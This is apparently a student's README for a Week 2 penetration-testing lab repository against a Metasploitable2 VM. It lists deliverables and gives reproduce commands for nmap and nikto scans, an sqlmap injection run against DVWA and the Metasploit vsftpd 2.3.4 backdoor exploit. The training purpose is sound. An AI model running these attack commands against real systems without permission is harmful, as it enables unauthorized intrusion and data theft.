# cyart-vapt-team — Week 2

**Author:** Ishan Chowdhury  
**Repository:** cyart-vapt-team  
**Week:** 2 — Vulnerability Assessment & Penetration Testing (VAPT) Lab

---

## Summary
This folder contains all artifacts produced during Week 2 of the VAPT practicals against a lab Metasploitable2 VM (target: `192.168.132.135`). Activities include reconnaissance, vulnerability scanning, exploitation, post-exploitation evidence collection, and reporting. The work is for training purposes and was performed in an isolated lab environment.

## Key Deliverables
- Nmap scans (full port and service/version scans)
- Nikto web scan output
- CSV vulnerability tracker (`scans_192-168-132-135.csv`)
- PoC snippets (sanitized) for validation (`poc_snippet_192-168-132-135.txt`)
- Remediation checklist (Slack-ready Markdown)
- DOCX report summarizing findings (`report_192-168-132-135.docx`)
- Escalation email DOCX (`escalation_email_192-168-132-135.docx`)
- Workflow and README files describing steps to reproduce

## Repository Structure (Week-2)
```
Week-2/
├── CSV Files/
│   └── scans_192-168-132-135.csv
├── DOCX Files/
│   ├── report_192-168-132-135.docx
│   └── escalation_email_192-168-132-135.docx
├── Nmap/
│   ├── nmap_cyart_basic.txt
│   └── nmap_cyart_allport.txt
├── Nikto/
│   └── nikto_cyart.txt
├── PoC/
│   └── poc_snippet_192-168-132-135.txt
├── Remediation/
│   └── remediation_checklist_192-168-132-135.md
├── Notes/
│   └── VAPT_2.txt
├── Screenshots/
└── Workflows/
    └── README.md
```

## How to reproduce (commands)
> Run these from your Kali VM in the lab environment only.

### Nmap
```bash
sudo nmap -sV 192.168.132.135 -oN Week-2/Nmap/nmap_cyart_basic.txt
sudo nmap -p- -T4 192.168.132.135 -oN Week-2/Nmap/nmap_cyart_allport.txt
```

### Nikto
```bash
nikto -h http://192.168.132.135 -output Week-2/Nikto/nikto_cyart.txt
```

### sqlmap (DVWA example)
```bash
sqlmap -u "http://192.168.132.135/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<SESSION>; security=low" --batch --dbs
```

### Metasploit (vsftpd example)
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.132.135
exploit
```

## Notes on Safety & Ethics
- All testing was performed in an isolated lab environment (Metasploitable2). Do **not** run these attacks against systems you do not own or have explicit permission to test.
- PoC outputs in this repo are sanitized to avoid exposing credentials or sensitive data.

## Submission
This repository (Week-2 folder) contains the required deliverables for submission. Push all changes to the `main` branch and share the GitHub repository link before the deadline.

## Contact
**Ishan Chowdhury** — VAPT Team  
Email: [your.email@example.com] (replace with your contact)

---
*Generated for Week 2 VAPT practicals.*
